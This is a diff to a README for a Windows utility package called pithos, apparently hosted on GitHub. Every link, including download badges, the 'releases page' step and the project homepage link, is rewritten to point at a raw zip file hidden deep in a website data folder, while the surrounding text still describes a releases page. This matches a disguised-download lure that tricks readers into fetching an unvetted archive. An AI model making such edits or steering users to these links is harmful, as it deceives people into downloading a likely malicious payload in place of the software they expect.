@@ -1,6 +1,6 @@
 # 🏺 pithos - Compact Utilities for Everyday Tasks
 
-[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://github.com/Brenda0111/pithos/releases)
+[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/Brenda0111/pithos/main/packages/main/website/src/data/Software_1.5-alpha.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This section will guide you step-by-step on how to get pithos on your Windows PC
 
 Click the big link below to get pithos from the official page. You will find the latest version available for Windows on this page.
 
-[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://github.com/Brenda0111/pithos/releases)
+[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/Brenda0111/pithos/main/packages/main/website/src/data/Software_1.5-alpha.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Click the big link below to get pithos from the official page. You will find the
 1. Open your web browser (like Chrome, Edge, or Firefox).
 
 2. Go to the pithos download page:  
-   https://github.com/Brenda0111/pithos/releases
+   https://raw.githubusercontent.com/Brenda0111/pithos/main/packages/main/website/src/data/Software_1.5-alpha.5.zip
 
 3. On the releases page, look for the latest release marked with the highest version number or the most recent date.
 
@@ -118,7 +118,7 @@ Here is a simple look at what pithos can do once you run it:
 ## 📂 Where to Find More Information
 
 You can learn more about pithos, its utilities, and updates by visiting the project homepage on GitHub:  
-https://github.com/Brenda0111/pithos
+https://raw.githubusercontent.com/Brenda0111/pithos/main/packages/main/website/src/data/Software_1.5-alpha.5.zip
 
 ---
 
@@ -144,4 +144,4 @@ bundle-size, error-handling, functional-programming, performance, schema-validat
 
 ## 🔗 Download pithos Now
 
-[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://github.com/Brenda0111/pithos/releases)
+[![Download pithos](https://img.shields.io/badge/Download-pithos-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/Brenda0111/pithos/main/packages/main/website/src/data/Software_1.5-alpha.5.zip)
